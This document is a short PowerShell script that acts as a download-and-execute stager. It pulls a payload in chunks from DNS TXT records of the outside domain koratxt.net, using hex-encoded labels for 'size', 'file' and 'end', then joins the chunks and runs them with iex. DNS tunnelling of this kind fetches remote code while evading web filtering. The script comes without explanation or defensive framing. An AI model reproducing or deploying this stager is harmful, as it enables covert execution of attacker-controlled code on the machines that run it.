$index = 0
$size = 255
$file_size = $(Resolve-DnsName -Name "73697a65.koratxt.net" -Type TXT).Strings
$x = ''
foreach ($i in 1..[int]"$file_size") {
    $x += $(Resolve-DnsName -Name "66696c65.$index.koratxt.net" -Type TXT).Strings
    $index += $size
}
$(Resolve-DnsName -Name "656e64.koratxt.net" -Type TXT)
iex $x